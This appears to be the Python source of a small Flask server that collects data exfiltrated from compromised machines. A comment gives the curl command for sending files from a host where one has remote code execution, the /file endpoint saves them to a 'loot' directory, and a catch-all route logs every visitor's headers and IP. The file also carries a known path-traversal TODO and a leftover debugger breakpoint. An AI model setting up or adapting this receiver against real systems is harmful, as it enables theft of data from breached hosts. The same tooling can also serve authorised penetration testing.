from flask import Flask
from flask import render_template
from flask import redirect
from flask import url_for
from flask import request, session, flash, send_file
from flask import make_response # for setting cookies
import flask
import os
import subprocess
import ipdb
import datetime

app = Flask(__name__)

##########
# Routes #
##########

# If you have RCE on a server, you can upload a file to this endpoint with:
#   curl -X POST --data-binary @path/to/filename.txt this_servers_ip:port/file?filename=fileToSaveAs.txt
#
# --data-binary preserves newlines in files that are extracted
#
# Note: this stores uploaded files to disk for easy perusal later, so if someone
# malicious starts hitting this endpoint they could fill up your harddrive.
@app.route("/file", methods=["POST"])
def file():
    print()
    log_meta_info(request)
    # TODO: ensure request can't write outside of LOOT_DIR
    filename = get_loot_filename(request.args.get('filename'))

    file_already_exists = False

    if os.path.exists(filename):
        print("[!] Warning, file already exists, not overwriting. Please specify a new file path")
        file_already_exists = True

    print()
    if not file_already_exists:
        print("File content saved to: %s" % filename)
    print("-----------------------")
    # Read filename out of URL param
    with open(filename, 'w') as f:
        for x in request.form.keys():
            print(x)
            if not file_already_exists:
                f.write(x)

    print("-----------------------")

    ipdb.set_trace()

    return "OK"

# Thanks: http://flask.pocoo.org/snippets/57/
@app.route("/", defaults={'path':''})
@app.route('/<path:path>')
def index(path):
    log_meta_info(request)
    print("Visited: %s" % path)
    return "OK"

# Helper methods

def log_meta_info(request):
    print("[*] %s - %s - From: %s" % (datetime.datetime.now(), request.method, request.remote_addr) )
    for header, value in request.headers.to_wsgi_list():
        print("  %s: %s" % (header, value))

# File to store uploaded file in locally
def get_loot_filename(filename):
    return os.path.join(LOOT_DIR, filename)

#################
# Server config #
#################

app.secret_key = "blah-doesn't-matter"

APP_ROOT = os.path.dirname(os.path.abspath(__file__))

LOOT_DIR = os.path.join(APP_ROOT, 'loot') # Store uploaded files in this dir

# Create the dir if necessary
if not os.path.exists(LOOT_DIR):
    os.makedirs(LOOT_DIR)

if __name__ == "__main__":
    # app.debug = True
    app.run(host='0.0.0.0') # Note: this makes the server publicly accessible, be careful friend
